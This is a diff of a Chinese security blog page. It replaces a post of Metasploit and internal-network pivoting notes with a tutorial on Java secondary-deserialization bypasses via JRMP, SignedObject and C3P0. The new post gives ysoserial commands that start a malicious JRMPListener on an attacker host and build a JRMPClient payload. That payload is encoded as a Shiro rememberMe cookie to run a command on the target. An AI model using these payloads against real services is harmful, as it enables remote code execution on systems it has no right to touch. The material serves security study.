@@ -11,7 +11,7 @@
   <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-  <title>msf笔记 | Godown_blog</title>
+  <title>常用的二次反序列化攻击 | Godown_blog</title>
 
   <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
   <link rel="stylesheet" href="https://at.alicdn.com/t/font_1911880_c1nvbyezg17.css">
@@ -591,14 +591,14 @@
 
 
 <div class="post-detail-header" id="thumbnail_canvas" style="background-repeat: no-repeat; background-size: cover; 
-  background-position: center center;position: relative;background-image:url('https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B818.png')">
+  background-position: center center;position: relative;background-image:url('https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8141.png')">
   <div class="post-detail-header-mask"></div>
   <canvas id="header_canvas"style="position:absolute;bottom:0;pointer-events:none;"></canvas>
   
   <div class="post-detail-header_info-box">
     <div class="title-box">
       <span class="title">
-        msf笔记
+        常用的二次反序列化攻击
       </span>
     </div>
     
@@ -619,21 +619,53 @@
   <div class="main-content">
     <article class="post post-detail">
       <div class="post-content">
-        <h1 id="msf笔记"><a href="#msf笔记" class="headerlink" title="msf笔记"></a>msf笔记</h1><p>先Nmap或者arp-scan扫端口，根据端口攻击。如果开了web端口，就想办法rce反弹shell。拿到shell后扫一下内网，目前只会ping扫，或者升msf，用msf的scan exp扫。然后在靶机上download venom客户端用以代理，在攻击机起服务端，socks通道打通后，更改proxychains4.conf（配置文件，名字可能不一样），实现攻击机的全局代理，然后带上Proxychains nmap扫内网靶机端口</p>
-<blockquote>
-<p>如果靶机打着无回显了，应该是靶机命令还没执行完，比如ping扫内网，命令还没执行完，在shell退了sessions，或者单纯的用ctrl+c，在靶机上命令是还会继续执行的，就导致了后续命令执行不了。这种情况再杀掉session重新打时，之前在靶机上的shell还在，就会发生如下情况：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[-] Command shell session 3 is not valid and will be closed</span><br><span class="line">[*] 192.168.137.129 - Command shell session 3 closed.</span><br></pre></td></tr></table></figure>
+        <p>一些链被黑名单ban了，可以用二次反序列化绕过，比如JRMP</p>
+<h2 id="JRMP"><a href="#JRMP" class="headerlink" title="JRMP"></a>JRMP</h2><p>JDK&lt;8U241</p>
+<p>JRMP打RMI，在ysoserial&#x2F;exploit中，JRMPClient能利用非RMI服务（如Shiro）开RMI服务，然后用exploit&#x2F;JRMPLister打RMI服务</p>
+<p>特征：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1099</span>);</span><br><span class="line"><span class="type">RemoteInterface</span> <span class="variable">remoteImpl</span> <span class="operator">=</span> (RemoteInterface) registry.lookup(<span class="string">&quot;remoteImpl&quot;</span>);<span class="comment">//lookup可被控制</span></span><br></pre></td></tr></table></figure>
 
-<p>可以把靶机重启，但是要重复许多步骤，最好不要杀掉sessions,进入之前没执行完命令的sessions，然后发送远程ctrl+c</p>
-</blockquote>
+<p>Usage：</p>
+<p>攻击者先在 vps上用 ysoserial 启一个恶意的 JRMPListener，监听在 19999 端口，并指定使用 CommonsCollections6 模块，要让目标执行的命令为 ping 一个域名：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> ysoserial.jar ysoserial.expeseloit.JRMPListener 19999 CommonsCollections6 <span class="string">&quot;ping cc6.m2pxdwq5pbhubx9p6043sg8wqnwdk2.burpcollaborator.net&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后用 ysoserial 生成 JRMPClient 的序列化 payload，指向上一步监听的地址和端口（假如攻击者服务器 ip 地址为 1.1.1.1）：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar JRMPClient <span class="string">&quot;1.1.1.1:19999&quot;</span> &gt; /tmp/jrmp.ser</span><br></pre></td></tr></table></figure>
+
+<p>再用 shiro 编码脚本对 JRMPClient payload 进行编码：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar shiro-exp.jar encrypt /tmp/jrmp.ser</span><br></pre></td></tr></table></figure>
+
+<p>将最后得到的字符串 Cookie 作为 rememberMe Cookie 的值，发送到目标网站。如果利用成功，则前面指定的 ping 命令会在目标服务器上执行。</p>
+<h2 id="SignedObject"><a href="#SignedObject" class="headerlink" title="SignedObject"></a>SignedObject</h2><p>SignedObject.getObject能反序列化this.content：</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241014214004303.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241014214004303.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241014214004303"></p>
+<p>content能在构造函数赋值</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241014214038344.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241014214038344.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241014214038344"></p>
+<p>适用于嵌套解析的resolveClass黑名单，比如Fastjson&gt;&#x3D;1.2.49</p>
+<p>JSONObject重写的resolveClass，加入checkAutoType验证黑名单</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241014222919494.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241014222919494.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241014222919494"></p>
+<p>也适用于不能触发readObject而不能初始化TemplatesImpl <code>_tfactory</code>字段的场景，比如自定义反序列化流程的Hessian、Kryo等</p>
+<h2 id="C3P0"><a href="#C3P0" class="headerlink" title="C3P0"></a>C3P0</h2><p>漏洞入口位于com.mchange.v2.ser.C3P0ImplUtils.parseUserridesAsString</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241016172934901.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241016172934901.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241016172934901"></p>
+<p>parseUserridesAsString对传入的参数userOverridesAsString字符串处理如下：</p>
+<ol>
+<li>从<code>HASM_HEADER</code>长度开始，截取到userOverridesAsString的末尾</li>
+</ol>
+<p>HASM_HEADER为<code>HexAsciiSerializedMap</code></p>
+<ol start="2">
+<li>调用<code>ByteUtils.fromHexAscii</code>把截取的十六进制字符串转为二进制</li>
+<li>调用<code>SerializableUtils.fromByteArray</code>反序列化字节码</li>
+</ol>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241016174046772.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241016174046772.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241016174046772"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241016174053242.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241016174053242.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241016174053242"></p>
+<p>向parseUserOverridesAsString传参<code>HexAsciiSerializedMap+恶意十六进制字节码</code>就能二次反序列化</p>
 
       </div>
       <div class="post-tags-categories">
         
         <div class="tags">
           
-            <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="">
-              内网渗透
+            <a href="/tags/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="">
+              二次反序列化
             </a>
           
         </div>
@@ -647,7 +679,7 @@
     </li>
     <li class="post-copyright-link">
     <strong>文章链接:  </strong>
-    <a href="/2022/01/03/msf-bi-ji/" target="_blank" title="msf笔记">https://godownio.github.io/2022/01/03/msf-bi-ji/</a>
+    <a href="/2025/03/25/chang-yong-de-er-ci-fan-xu-lie-hua-gong-ji/" target="_blank" title="常用的二次反序列化攻击">https://godownio.github.io/2025/03/25/chang-yong-de-er-ci-fan-xu-lie-hua-gong-ji/</a>
     </li>
     <li class="post-copyright-license">
       <strong>版权声明:   </strong>
@@ -665,41 +697,22 @@
 
 
 
-  
-  <div class="post-nav-prev post-nav-item">
-    <div class="post-nav-img" style="background-size: cover; 
-      background-position: center center;">
-      <img class="lazyload lazyload placeholder" src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B857.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B857.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
-    </div>
-    <a href="/2022/03/29/di-jiu-jie-zhong-ke-da-hackgame2022-web-wp-ji-xin-si-lu/" class="post-nav-link">
-      <div class="title">
-        <i class="fas fa-angle-left"></i> 上一篇:
-        <div class="title-text">第九届中科大hackgame2022 web WP及新思路</div>
-      </div>
-      
-      <!-- <div class="content">
-        ctf比赛地址：https://hack.lug.ustc.edu.cn
-大佬博客里wp写的很清楚了，官方wp也写的很好
-      </div> -->
-    </a>
-  </div>
-
 
 
   
   <div class="post-nav-next post-nav-item">
     <div class="post-nav-img" style="background-size: cover; 
       background-position: center center;">
-      <img class="lazyload lazyload placeholder" src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B860.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B860.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" src="" alt="">
+      <img class="lazyload lazyload placeholder" src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8140.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8140.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" src="" alt="">
     </div>
-    <a href="/2021/12/10/tong-guo-bian-jie-dai-li-yi-lu-da-dao-san-ceng-nei-wang-hou-shen-tou-tong-yong-shou-fa/" class="post-nav-link">
+    <a href="/2025/03/25/spring-dispatcherservlet-xiang-jie/" class="post-nav-link">
       <div class="title">
         下一篇: <i class="fas fa-angle-right"></i>
-        <div class="title-text">通过边界代理一路打到三层内网+后渗透通用手法</div>
+        <div class="title-text">DispatcherServlet.doDispatch请求分发详解</div>
       </div>
       <!-- <div class="content">
-        外网进内网通常就是通过web漏洞拿取shell
-内网的很大一部分信息收集是围绕网络拓扑图展开的。可以社工运维或者goog
+        DispatcherServlet.doDispatch详解今天来分析一下：
+在DispatcherServlet.do
       </div> -->
     </a>
   </div>
@@ -920,7 +933,7 @@
   <div class='content'>
     <div class="toc-main">
       <div class="toc-content">
-        <!-- <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#msf%E7%AC%94%E8%AE%B0"><span class="toc-text">msf笔记</span></a></li></ol> -->
+        <!-- <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#JRMP"><span class="toc-text">JRMP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SignedObject"><span class="toc-text">SignedObject</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#C3P0"><span class="toc-text">C3P0</span></a></li></ol> -->
         <div class="toc"></div>
       </div>
     </div>
